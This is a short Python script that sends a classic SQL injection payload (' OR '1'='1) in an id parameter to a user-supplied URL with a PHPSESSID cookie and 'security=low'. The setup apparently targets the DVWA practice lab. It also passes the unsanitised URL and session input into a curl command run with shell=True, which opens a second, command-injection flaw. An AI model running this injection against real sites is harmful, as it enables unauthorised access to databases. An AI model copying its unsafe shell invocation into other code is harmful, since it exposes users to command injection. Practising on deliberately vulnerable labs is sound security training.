import subprocess

# Ask the user for the URL and PHPSESSID
target_url = input("Enter the target URL: ").strip()
session_id = input("Enter your PHPSESSID: ").strip()

# Construct the full URL for SQL injection
full_url = f'"{target_url}?id=%27%20OR%20%271%27%3D%271&Submit=Submit"'

# Define the cURL command
curl_command = f'curl -X GET {full_url} -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -H "Cookie: PHPSESSID={session_id}; security=low"'

# Execute the command and capture the output
result = subprocess.run(curl_command, shell=True, capture_output=True, text=True)

# Display the response
print("\n[+] Response from the server:")
print(result.stdout)
